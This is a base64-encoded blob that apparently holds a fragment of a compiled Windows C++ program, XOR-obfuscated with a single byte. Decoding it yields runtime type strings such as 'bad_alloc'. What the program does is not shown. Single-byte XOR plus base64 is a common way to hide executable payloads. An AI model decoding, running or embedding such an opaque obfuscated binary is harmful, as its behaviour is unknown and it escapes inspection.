xcXdhsXF3obFxdkGxcXYBsXF5QbFxeeGxcXhhsXF4IbFxeKGxcXpBsXF6IbFxeuGxcXrBsXF9AbFxf0GxcX8hsXF/wbFxfmGxcX4BsXF+wbFxcWGhcXFBoXFxgaFxcEGhcXCBoXFzYaFxc8GhcXOhoXFyoaFxcoGhcXWBoXF0IaFxd+GhcXbhoXF5YaFxeSGhcXkBoXF5waFxeaGhcXtBoXF7waFxegGhcXqhoXF9AaFxfeGhcX2hoXF8QaFxfCGhcXzBoXF/IaFxfwGhcX5BoXF+oaFxfoGhcXHhkXFwAZFxcKGRcXNhkXFzAZFxc4GRcXIhkXFywZFxdcGRcXQBkXF04ZFxdKGRcXfBkXF2YZFxdiGRcXahkXF5AZFxeYGRcXghkXF4wZFxemGRcXoBkXF64ZFxfUGRcXxhkXF8IZFxfMGRcX+hkXF/gZFxfuGRcXEBgXFxwYFxcaGBcXABgXFzIYFxc+GBcXJhgXF1QYFxdQGBcXWhgXF1gYFxdEGBcXThgXF0wYFxdwGBcXfBgXF2gYFxeCGBcXthgXF7QYFxewGBcXuhgXF6QYFxeiGBcXrBgXF8YYFxfEGBcXzhgXF/4YFxf4GBcX7BgXF+oYFxcUBxcXGAcXFwgHFxc2BxcXMgcXFzwHFxcuBxcXKgcXFygHFxdGBxcXfgcXF2QHFxduBxcXbAcXF5IHFxeQBxcXhgcXF4QHFxeKBxcXtAcXF7IHFxe4BxcXpgcXF6wHFxfWBxcX3gcXF/AHFxfmBxcX5AcXF+oHFxcSBhcXHAYXFwIGFxcwBhcXOgYXFy4GFxdSBhcXUAYXF04GFxdIBhcXdAYXF34GFxd4BhcXlgYXF5QGFxeaBhcXjAYXF7YGFxeyBhcXsAYXF7wGFxfUBhcX0gYXF8YGFxfABhcX8AYXF/gGFxfiBhcX7AYXFxoFFxcKBRcXCAUXFzQFFxc+BRcXPAUXFyYFFxcgBRcXVgUXF1AFFxdEBRcXSAUXF2YFFxdkBRcXbgUXF2oFFxeYBRcXgAUXF7gFFxekBRcXogUXF64FFxeoBRcX1gUXF9oFFxfGBRcXyAUXF+oFFxcQBBcXGgQXFw4EFxcwBBcXOgQXFyAEFxdUBBcXUgQXF14EFxdYBBcXQAQXF0oEFxdwBBcXfgQXF3oEFxdsBBcXlgQXF5AEFxecBBcXhgQXF4QEFxeKBBcXiAQXF7gEFxesBBcX1AQXF8IEFxfOBBcXyAQXF/wEFxf6BBcX5AQXF+4EFxfoBBcXDAMXFzYDFxc4AxcXJAMXFywDFxdSAxcXWgMXF04DFxd8AxcXeAMXF2YDFxdiAxcXmgMXF44DFxeIAxcXtgMXF6YDFxegAxcXqgMXF9wDFxfCAxcX9AMXF/ADFxcSAhcXHAIXFwYCFxcAAhcXCAIXFzICFxc+AhcXPAIXFyACFxcqAhcXVgIXF1QCFxdeAhcXSAIXF3ICFxdwAhcXfAIXF2oCFxdoAhcXlAIXF5gCFxeGAhcXgAIXF4wCFxeiAhcXrAIXF9YCFxfSAhcX2gIXF8ACFxfgAhcXEAEXFx4BFxcYARcXBAEXFwIBFxcOARcXDAEXFzIBFxckARcXLgEXFyoBFxdSARcXWAEXF0IBFxd+ARcXegEXF3gBFxdiARcXhAEXF4ABFxeIARcXvgEXF7gBFxeiARcXqgEXF9QBFxfYARcXxAEXF84BFxfMARcX9gEXF/IBFxf8ARcX+gEXF+ABFxfuARcXHgAXFxgAFxc0ABcXMAAXFyQAFxdWABcXSgAXF3QAFxdgABcXbAAXF5oAFxeCABcXjAAXF4gAFxeyABcXpAAXF64AFxeoABcX3gAXF9wAFxfCABcX9gAXF/4AFxfkABcX4gAXF+gAFxcQDxcXBA8XFwoPFxciDxcXIA8XFywPFxdUDxcXXg8XF1oPFxdCDxcXcA8XF2YPFxdgDxcXag8XF2gPFxeSDxcXmA8XF4wPFxeKDxcXsA8XF7oPFxekDxcXrg8XF9YPFxfQDxcXxg8XF8APFxfODxcXyA8XF/IPFxf8DxcX4g8XF+oPFxcCDhcXDA4XFyYOFxckDhcXUg4XF14OFxdGDhcXTA4XF24OFxeWDhcXhA4XF4AOFxeODhcXtA4XF74OFxe8DhcXpg4XF6IOFxfQDhcX2A4XF8wOFxf6DhcX6g4XFxQNFxcSDRcXBg0XFwANFxc2DRcXNA0XFzoNFxc4DRcXIg0XFygNFxdaDRcXRg0XF34NFxd8DRcXbA0XF2oNFxeQDRcXng0XF4QNFxewDRcXvA0XF7oNFxemDRcXrg0XF94NFxfYDRcXwg0XF8ANFxf0DRcX5A0XF+wNFxfoDRcXEgwXFzQMFxcyDBcXOAwXFyYMFxcgDBcXLAwXF1YMFxdQDBcXWAwXF0IMFxdODBcXcgwXF3wMFxdkDBcXaAwXF5QMFxeGDBcXigwXF7AMFxeoDBcX0gwXF8YMFxfADBcXzgwXF/gMFxfgDBcXHgsXFwQLFxcOCxcXMAsXFzwLFxc6CxcXJAsXFyoLFxdSCxcXXAsXF1gLFxdCCxcXZAsXF5YLFxecCxcXmgsXF44LFxe0CxcXsgsXF6ILFxegCxcX3gsXF/YLFxfkCxcX7gsXFx4KFxcMChcXNgoXFzQKFxciChcXLgoXFygKFxdWChcXXAoXF0QKFxdKChcXdAoXF34KFxdmChcXYgoXF2wKFxdqChcXkAoXF54KFxeCChcXjgoXF4gKFxeyChcXsAoXF6QKFxegChcX0goXF8AKFxfMChcX9goXF+IKFxfuChcXFgkXFxAJFxccCRcXBAkXFwAJFxcyCRcXPAkXFzgJFxcqCRcXXgkXF1oJFxdYCRcXegkXF2YJFxeeCRcXmAkXF4IJFxe2CRcXugkXF6wJFxfWCRcX0gkXF9AJFxfcCRcXygkXF/QJFxf4CRcX4AkXF+oJFxcWCBcXGggXFxgIFxcMCBcXLggXF14IFxdcCBcXRggXF3AIFxdiCBcXbAgXF5IIFxeGCBcXgAgXF44IFxeKCBcXsggXF7gIFxeiCBcXrAgXF8QIFxf2CBcX8AgXF/wIFxfkCBcX6AgXFxcXFxdPLOdc1Bhj/7HSvX5R3bBCkH++rTvEAAkrq8sUpcYk5+fZFgfD2RYHb9kWB3PZFgcz2RYHA9kWBxPZFgfn2hYHy9oWB6vaFgef2hYHc9oWByvaFgcL2hYH59sWB9PbFgeP2xYHa9sWB3/bFgdT2xYHJ9sWBwvbFgf73BYHr9wWB5fcFgdb3BYHM9wWBwPcFgcf3BYH790WB8/dFger3RYHk90WB3/dFgcr3RYHA90WB+PeFgfH3hYHo94WB4veFgdr3hYHX94WBz/eFgcf3hYH798WB9ffFge33xYHY98WB3PfFgdX3xYHJ98WBw/fFgfv0BYH89AWB9/QFger0BYHp9AWB4PQFgd/0BYHR9AWBzvQFgcT0BYH89EWB6vRFgeH0RYHe9EWB1vRFgcv0RYHC9EWBxfRFgf/0hYH29IWB7vSFgeH0hYHa9IWB3fSFgdT0hYHD9IWBxfSFgfz0xYH19MWB4vTFgdv0xYHT9MWBzPTFgfHxxYHFxcXFzkoVkF1dnNIdnt7eHRXZGNzV1cXx8cWBxcXFxc5KFZBcm90cmdjfnh5V2Rjc1dXF8fHFgcXFxcXOShWQWVieWN+enJIcmVleGVXZGNzV1cXx8cWBxcXFxc5R1ZBZWJ5Y356ckhyZWV4ZVdkY3NXVxfHxxYHFxcXFzlHVkFyb3RyZ2N+eHlXZGNzV1cXx8cWBxcXFxc5R1ZPFxcXF8fHFgcXFxcXOShWQXpuZHh0fFdXFxcXF8fHFgcXFxcXOShWQVRkUGJ2ZXNXVxcXF8fHFgcXFxcXOShWQWN0Z2R4dHxXVxcXF8fHFgcXFxcXOShWQWNuZ3JIfnlxeFdXF1nxV6ymDqhTFxcXFxcXFxd7eHAXYo8XF2SPFxcXFxcXN2wVBxcXFxc3bBUHFhYXFxcXFxcXFxcXFwcXFxcXFxcXFxcXFxcXFxcXFxcVFxcXFhcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxUXFxcVFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXF1PGFgcjxhYHFhcXFwEXFxcVFxcXFRcXFxQXFxcVFxcXExcXFw8XFxcSFxcXGhcXFxEXFxceFxcXEBcXFxsXFxcfFxcXGxcXFx4XFxcbFxcXHRcXFxAXFxccFxcXHxcXFxsXFxcBFxcXGhcXFwEXFxcYFxcXFRcXFwcXFxcaFxcXBhcXFwUXFxcFFxcXFRcXFzYXFxcaFxcXIhcXFxUXFxdWFxcXGhcXF1QXFxcVFxcXRxcXFwYXFxdFFxcXGhcXF0QXFxcaFxcXQBcXFwEXFxdOFxcXHBcXF3sXFxcaFxcXehcXFzcXFxdnFxcXCxcXF2UXFxceFxcXERcXFwEXFxeXFxcXHRcXF5YXFxcdFxcXlRcXFx4XFxeUFxcXARcXF5MXFxcaFxcXhhcXFz4XFxeJFxcXGhcXF7YXFxcVFxcXsxcXFxwXFxewFxcXGhcXF6AXFxcGFxcX2RcXFxUXFxfAFxcXHBcXFw8QFxcbFxcXGxcXFx8XFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBxcXFxcXFzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3FxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXdnV0c3JxcH9+fXx7enl4Z2ZlZGNiYWBvbm0XFxcXFxdWVVRTUlFQX15dXFtaWVhHRkVEQ0JBQE9OTRcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBxcXFxcXFzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3FxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXF3Z1dHNycXB/fn18e3p5eGdmZWRjYmFgb25tFxcXFxcXVlVUU1JRUF9eXVxbWllYR0ZFRENCQUBPTk0XFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXxyoVBxYVEx+zFBcXd5VulTYXFxcXFxcXscgXFxcXFxe2shcXFxcXF5aI9+sXFxcXV2mX6xcXFxe/FBcX1rTNtDcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXF5bpFxcXFxcXV+kXFxcXFxeiFBcX1rTNtDcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXF5bpFxcXFxcXVukXFxcXFxehFBcX2LXztQ0X8rX/tUwXFxcXFxcXFxcXFxcXFxcXF5bpFxcXFxcXV2m26RcXFxdGEhcXRs1JzTcXSM19zSUXFxcXFxcXFxcXFxcXFxcXF5bEz8n37hcXJmmW6RcXFxfp6OjoVBcXF+/DFgfjwxYH58MWB/vDFgf/wxYH88MWB/fDFgfPwxYHx8MWB9/DFgerwxYHp8MWB7/DFgeLwxYHj8MWB4PDFgeHwxYHm8MWB5/DFgeTwxYHl8MWB2vDFgdvwxYHY8MWB2fDFgd7wxYHc8MWB0/DFgdHwxYHX8MWB5/DFgdXwxYHL8MWByfDFgczwxYHC8MWBwfDFgcTwxYHF8MWB+vEFgfnxBYHy8QWB8fEFgceExcXFhcXFxcXFxffxBYH18QWB6/EFgenxBYHv8QWB7fEFgePxBYHn8QWB2/EFgd/xBYHQ8QWB1fEFgcnxBYHC8QWBwPEFgcbxBYHE8QWB+vFFgfjxRYH+8UWB/PFFgfLxRYHw8UWB9vFFgfTxRYHq8UWB7vFFgePxRYHm8UWB5fFFgfjxRYHY8UWB3/FFgdPxRYHU8UWByPFFgc3xRYHG8UWBxPFFgfrxhYH/8YWB9fGFge7xhYHFxcXFxYXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxfjVRUHFxcXFxcXFxcXFxcX41UVBxcXFxcXFxcXFxcXF+NVFQcXFxcXFxcXFxcXFxfjVRUHFxcXFxcXFxcXFxcX41UVBxcXFxcXFxcXFxcXFxYXFxcWFxcXFxcXFxcXFxcXFxcXP14VBxcXFxcXFxcXp+8WBy/qFgev6RYH71UVB3dTFQd3UxUHxyoVB+jo6Ojo6Ojoo+0WB3gMFgd4DBYHeAwWB3gMFgd4DBYHeAwWB3gMFgd4DBYHeAwWB3gMFgcXFxcXFxcXF+jo6OgXFxcXFxcXF+jo6OgXFxcXFxcXF5dnFxcWFxcX5+bo6BcXFxdHREMXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXR1NDFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXF79SFQf/UhUH6Ojo6JcdFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFRUVFRUVFRUVFRUVFRUVFRQUFBQUFBQUFxcXFxcXFxfHxxYHFxcXFzkoVkF1dnNIcm90cmdjfnh5V2Rjc1dXFxUXFxcXFxcXFxcXFxYXFxcXFxcXFhcXFxcXFxcXFxcXFxcXFxYXFxcXFxcXFhcXFxcXFxcXFxcXFxcXFxYXFxcXFxcXFhcXFxcXFxcWFxcXFxcXFxcXFxcXFxcXFhcXFxcXFxcXFxcXFxcXFxYXFxcXFxcXFhcXFxcXFxcWFxcXFxcXFxcXFxcXFxcXFhcXFxcXFxcWFxcXFxcXFxYXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcX6Ojo6AkXFxcsFxcXTRcXF28XFxeAFxcXohcXF8MXFxfkFxcXBhYXFycWFxdZFhcXehYXF+jo6OgJFxcXLRcXF04XFxdgFxcXgRcXF6MXFxfEFxcX5RcXFwcWFxc4FhcXWhYXF3sWFxc5FxcXORcXFzdeFQeTbhUHk24VB5NuFQeTbhUHk24VB5NuFQeTbhUHk24VB5NuFQdoaGhoaGhoaDNeFQefbhUHn24VB59uFQefbhUHn24VB59uFQefbhUHP14VB6fvFgel7RYHFhcXFzkXFxcWFxcXNxKEDhcXFxcXFxcXFxcXF4MxFxcXFxcXFxcXFxcX52gXFxcXFxfv6Ojo6Ojo6PhoFxcXFxcXBxcXFxcXFxcXlwMXFxdnFxUHChcXF2MXFQcNFxcXcxcVBwwXFxd/FxUHCBcXF3MWFQcEFxcXSxYVBzYXFxdDFhUHGRcXF0sXFQcaFxcXQxcVBxgXFxdTFxUHBxcXF1sWFQcSFxcXUxYVBwkXFxc/FxUHBRcXFzMXFQc3FxcXNxcVBxsXFxcrFxUHHBcXFyMXFQcCFxcXKxYVBwsXFxc7FxUHDhcXFyMWFQcGFxcXOxYVBw8XFxczFhUHARcXFwsWFQcAFxcXAxYVBzUXFxcHFhUHNBcXFxsWFQczFxcXHxYVBzIXFxcXFhUHMRcXF+MXFQcXFxcXFxcXlwdTFxcWFxcXFxcXlxcnFxcWFxcXFxMXFxbr6OgiFxcXHBcXF1cXFxfoFBcXlxcXF5bo6OgPFxcXHxcXFzcXFxdoFxcX6ejo6BcXFxcXFxcXFxcXFxcXFxcXtxVXFxcXFxcXFxcX3xJXFxcXFxcXFxcX7R9XFxcXFxcXFxdXixtXFxcXFxcXFxdH1BhXFxcXFxcXFxcz4wVXFxcXFxcXF5eBjwFXFxcXFxcXFzerqQ5XFxcXFxcTqN4MmSNXFxcXtvrb2QzVxFlXN+eJomc8v7rSin5Xx0rqMvINmVgO/JRXZoHAglQZEpo+uIlX7qi3U/qWBZiWla5XqCvCsdjoXghv1cRXeNH3m/6X3lCthL9Wq5J8QjAumuBn92tVq8qZye6K7PxpvUZUtvFh9NvlPjiTljFTPwcAve+5B/TS0+1T/LDD5OD89l1tgthSctvQhhmxubcO9LRRGnIAG2KWkWJh3l9aT1XzsIQuLCKvpfpEWrDySirSSiyciYVN6Eqx57Y310OymyB2xuqcTZzPMkqe7sxwvYLv5DCotd9Kypd5W96MgDedFUV30zJiFxcXF9rb2tvb29vb29vsKGYqHcC0ZyodwLTvKE1zLMhYmoB5BZTiKNTEO3IO9U8AoMbmKMcYNJNQDFC70rD5KFexoX57uBKqIJH8KCQqq1Vt8sKDqMHwKNXq6tl2kwZg27zzKDhbTPZa06mDgvHeKIXTRCxiU9oDqY24KMlwrYMuUroJptiDKDM00fWrrSwmdpxtKHZCTtZppkRrBaxIKMD5OJoRqYWSAuxTKDMosv4usjD9aL89KGq7tvOrc2tRx8pCKXRsEds0Q2CU6IaWKobtLQ5tdDJUJte7Kzaexi+VUICvF+rALMufTx8Mpv/0kbEULNGTUlUQoY5iIMw5LSRmC8U0zCX5XodNLrGQqddAzbKVsbWiJfV/pQawRYhTTqAHOzJe8zohI1hEudl8MphOE7PXydVq7P/RCYnwn01AhiuoR5Q1D1lccnXqlJi4EYNqBvM6yYjZxd8TyrHPHcfHFgcXFxcXOShWQXt4cH50SHJlZXhlV2Rjc1dXFxcXx8cWBxcXFxc5KFZBe3J5cGN/SHJlZXhlV2Rjc1dXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcHFxdDFxcXFScZJ3AjbSOBLnYtmSyhLPQsGCsOKzErJytRK0ArSCtyK3orZCuQK4ErvivdK/Ur+CsGKj8qKypRKkIqdyp6Kp0qgCq9KtoqwyqeKRc3FxcLFxcXASFaIQYgNSBXIEIgwi25K/YoFxcXJxcXcxcXFzYnbSf1JoIlSiRxJGQkjyRtI6ciFCD6IOkguC6tLsIu1S0uLLgsCivUK/0rKSpeKkUqBCk0KTkpWSlxKZUpgymIKdApxSntKRIoOigvKHcofCiEKIko0SjGKO4oF1cXFxMWFxcTJzsnICdIJ30nhSeKJ9InESZfJlomYiaXJr8mpCbMJvEmGSUOJVYlWyVjJWglsCWlJc0l8iUaJA8kVyRcJGQkaSSxJNsk+yQ7I04jbiO4I/wjJSJkIoQi9CIOIUIhsSH1IRQgXSCDINIg3CDiI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